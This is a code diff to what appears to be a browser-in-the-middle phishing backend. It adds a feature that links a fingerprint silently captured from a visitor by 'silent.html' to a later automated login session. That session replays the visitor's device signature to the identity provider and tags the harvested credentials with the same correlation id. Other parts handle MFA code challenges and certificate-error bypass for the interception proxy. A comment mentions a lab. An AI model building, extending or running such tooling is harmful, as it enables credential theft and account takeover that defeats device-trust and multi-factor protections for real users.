@@ -308,7 +308,7 @@ def _entries_to_har(entries: list, session_id: str) -> dict:
     return {
         "log": {
             "version": "1.2",
-            "creator": {"name": "mitm-proxy", "version": "1.0"},
+            "creator": {"name": "bitm-proxy", "version": "1.0"},
             "browser": {"name": "Playwright", "version": "—"},
             "pages": [],
             "entries": har_entries,
@@ -1350,8 +1350,8 @@ async def launch_auto_session(login_url: str, *, site_id: str = "",
         # Modern Chromium silently drops --ignore-certificate-errors
         # unless --test-type is also set. Without the pair, the
         # browser still sends SSLV3_ALERT_CERTIFICATE_UNKNOWN to the
-        # MITM proxy on every leaf it doesn't trust (visible in the
-        # auth_proxy log as "MITM TLS handshake failed for ...").
+        # BITM proxy on every leaf it doesn't trust (visible in the
+        # auth_proxy log as "BITM TLS handshake failed for ...").
         chromium_args += ["--ignore-certificate-errors", "--test-type"]
 
     launch_opts: dict = {"headless": True, "args": chromium_args}
@@ -1363,6 +1363,8 @@ async def launch_auto_session(login_url: str, *, site_id: str = "",
     # chromium path we already had. See backend/ua_engine.py for the UA
     # classifier and backend/shared.py for the toggles.
     engine_family, engine_channel = _pick_engine_for(login_url, sid)
+    if browser_type == "firefox":
+        engine_family, engine_channel = "firefox", None
     if engine_family != "chromium":
         # Firefox + WebKit don't take chromium args or channels.
         launch_opts.pop("channel", None)
@@ -1453,6 +1455,23 @@ def rename_auto_session_user(sid: str, new_user_id: str) -> None:
          session_id=sid)
 
 
+def _find_capture_by_cid(cid: str) -> tuple[str, dict] | tuple[None, None]:
+    """Locate the external/silent capture carrying correlation id `cid`.
+
+    Silent captures land in `credentials_store` (via
+    `/api/capture/external`); `silent.html` stamps a `cid` on the record so
+    a follow-on `:8091` session started with `?cid=` can find the exact
+    capture and replay that visitor's device. Small linear scan — the lab
+    holds a handful of records, and this only runs at session start."""
+    if not cid:
+        return None, None
+    for key in credentials_store.list_keys():
+        rec = credentials_store.get(key)
+        if rec and rec.get("cid") == cid:
+            return key, rec
+    return None, None
+
+
 @router.websocket("/session")
 async def browser_session(
     ws: WebSocket,
@@ -1466,6 +1485,7 @@ async def browser_session(
     start_url: str = Query(default=""),
     trace: bool = Query(default=False),
     prefer_push: Optional[bool] = Query(default=None),
+    cid: str = Query(default=""),
 ):
     if not verify_ws_key(ws):
         await ws.close(code=4001, reason="Invalid or missing API key")
@@ -1513,6 +1533,47 @@ async def browser_session(
         except Exception:
             device = None
     device_id = resolved_device_id
+
+    # Correlation id (`?cid=`) — ties a prior silent fingerprint capture to
+    # this follow-on login session. `silent.html` captures the visitor's
+    # real device fingerprint and hands them onward to /start?cid=…; here we
+    # find that capture and build/reuse a device profile from it so this
+    # server-side Playwright session replays the visitor's actual device
+    # signature. An explicit `?device_id=` (or a resolved default device)
+    # wins — cid only fills the gap when no device was otherwise chosen.
+    cid = (cid or "").strip()
+    linked_capture_key = None
+    if cid and device is None:
+        try:
+            from backend import devices as _devices
+            cap_key, cap_rec = _find_capture_by_cid(cid)
+            fp_src = ((cap_rec or {}).get("external_capture_metadata") or {}).get("fingerprint") or {}
+            if cap_rec and fp_src:
+                cid_device = _devices.find_or_create_for_cid(cid, fp_src, cap_key)
+                if cid_device:
+                    device = cid_device
+                    device_id = cid_device["id"]
+                    linked_capture_key = cap_key
+                    # Stamp the reverse link onto the silent capture so the
+                    # dashboard's Captured Data card shows it seeded a session.
+                    try:
+                        await credentials_store.update(cap_key, lambda d: {
+                            **d,
+                            "linked_device_id": cid_device["id"],
+                            "linked_session_at": time.time(),
+                        })
+                        notify_sites_changed()
+                    except Exception:
+                        pass
+                    _log(f"CID_LINK cid={cid} capture={cap_key} "
+                         f"device={cid_device['id']} engine={cid_device.get('engine_family')} "
+                         f"— replaying silent-capture fingerprint", category="devices")
+            else:
+                _log(f"CID_LINK cid={cid} — no silent capture with a usable "
+                     f"fingerprint found; launching without profile",
+                     category="devices")
+        except Exception as e:
+            _log(f"CID_LINK failed cid={cid}: {e}", category="devices", level="warn")
 
     # Resolve target alias to actual URL (aliases defined in sites.yaml)
     _targets = _rules.login_targets()
@@ -1596,13 +1657,18 @@ async def browser_session(
         if hint and "@" in hint:
             user_id = hint
     cred_key = _make_cred_key(site_id, user_id)
-    # Mutable container so lambdas/closures see updates when user_id changes
-    _cred = {"key": cred_key, "user": user_id}
+    # Mutable container so lambdas/closures see updates when user_id changes.
+    # `cid`, when present, rides along so the credentials this session
+    # captures carry the same correlation id as the silent fingerprint
+    # capture that seeded it — closing the tie in both directions.
+    _cred = {"key": cred_key, "user": user_id, "cid": cid}
     # Track MFA code challenge for timeout handling
     _mfa_challenge_time: Optional[float] = None
     _mfa_code_timeout_seconds = 300  # 5 minutes
     register_session(sid, {"login_url": login_url, "site_id": site_id,
-                            "user_id": user_id, "trace": bool(trace)})
+                            "user_id": user_id, "trace": bool(trace),
+                            "cid": cid or None,
+                            "linked_capture_key": linked_capture_key})
     try:
         _subs.start_subsession(sid, site_id, user_id, login_url)
     except Exception:
@@ -1727,6 +1793,10 @@ async def browser_session(
             launch_opts["channel"] = "msedge"
 
         engine_family, engine_channel = _pick_engine_for(login_url, sid)
+        if browser_type == "firefox":
+            # Explicit operator choice overrides fingerprint auto-pick, but
+            # a device profile (below) is more specific still and wins.
+            engine_family, engine_channel = "firefox", None
         if device:
             engine_family = device.get("engine_family") or engine_family
             engine_channel = device.get("channel") or None
@@ -1843,8 +1913,8 @@ async def browser_session(
                 "AppleWebKit/605.1.15 (KHTML, like Gecko) "
                 "Version/17.4 Mobile/15E148 Safari/604.1 Edg/122.0.0.0"),
         }
-        if browser_type == "edge-real" and not mobile:
-            pass  # let real Edge use its native UA
+        if browser_type in ("edge-real", "firefox") and not mobile:
+            pass  # let the real browser (Edge or Firefox) use its native UA
         elif mobile and mobile_profile in _UA:
             ua = _UA[mobile_profile]
             # Append Edge branding if using Edge browser type (for non-edge-specific profiles)
@@ -1870,7 +1940,7 @@ async def browser_session(
             context_opts.update(device_scale_factor=dpr)
 
         # Fingerprint replay — if the user has been browsing the target
-        # through the MITM on :3128, adopt their real User-Agent + client
+        # through the BITM on :3128, adopt their real User-Agent + client
         # hints + Accept-Language so the IdP sees the same device it
         # already trusts. Off by default; enable via config.
         if get_config_value("use_captured_fingerprint", False):
@@ -2678,6 +2748,8 @@ async def browser_session(
                     cred_data["captured_inputs"] = _capture_inputs
                     cred_data["user_id"] = _capture_user
                     cred_data["site_id"] = site_id
+                    if _cred.get("cid"):
+                        cred_data["cid"] = _cred["cid"]
                     return cred_data
 
                 cred_data = await credentials_store.update(
@@ -3163,6 +3235,8 @@ async def browser_session(
                         cred_data["captured_inputs"] = _cap_inputs
                         cred_data["user_id"] = _cap_user
                         cred_data["site_id"] = site_id
+                        if _cred.get("cid"):
+                            cred_data["cid"] = _cred["cid"]
                         return cred_data
 
                     cred_data = await credentials_store.update(
@@ -3433,7 +3507,7 @@ async def download_auth_proxy_ca():
     return Response(content=cert_path.read_bytes(),
                      media_type="application/x-pem-file",
                      headers={"Content-Disposition":
-                              'attachment; filename="mitm-proxy-ca.crt"'})
+                              'attachment; filename="bitm-proxy-ca.crt"'})
 
 
 @router.post("/auth_proxy/ca")
